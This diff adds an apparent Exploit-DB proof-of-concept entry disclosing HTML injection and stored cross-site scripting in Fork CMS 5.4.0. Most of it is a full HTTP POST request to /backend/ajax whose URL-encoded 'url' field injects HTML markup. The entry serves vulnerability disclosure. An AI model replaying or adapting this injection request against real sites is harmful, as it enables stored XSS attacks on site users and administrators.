@@ -1,0 +1,29 @@
+# Exploit Title: Fork CMS 5.4.0 - Cross-Site Scripting
+# Date: 2018-09-26 
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: https://www.fork-cms.com/
+# Software Link : https://github.com/forkcms/forkcms
+# Software : Fork 5.4.0
+# Product Version: 5.4.0
+# Vulernability Type : Code Injection
+# Vulenrability : HTML Injection and Stored XSS
+
+# In the 5.4.0 version of the Fork CMS software, HTML Injection and Stored XSS vulnerabilities 
+# were discovered via the /backend/ajax URI.
+
+# HTTP POST Request :
+
+POST /backend/ajax HTTP/1.1
+Host: Target
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: https://Target/private/en/pages/add?token=2quwpxbx78
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 299
+Cookie: track=s%3A32%3A%22e36b0c664ad21e30c493893c3612f5cc%22%3B; PHPSESSID=1103079034ec4a8e726bea6a0746731e; interface_language=en; frontend_language=en; track=1; jstree_open=page-425
+Connection: close
+
+fork%5Bmodule%5D=Core&fork%5Baction%5D=GenerateUrl&fork%5Blanguage%5D=en&url=%22%3E%3Ch1%3EIsmail+Tasdelen%3C%2Fh1%3E&metaId=&baseFieldName=title&custom=1&className=Backend%5CModules%5CPages%5CEngine%5CModel&methodName=getUrl&parameters=a%3A3%3A%7Bi%3A0%3Bi%3A0%3Bi%3A1%3Bi%3A0%3Bi%3A2%3Bb%3A0%3B%7D
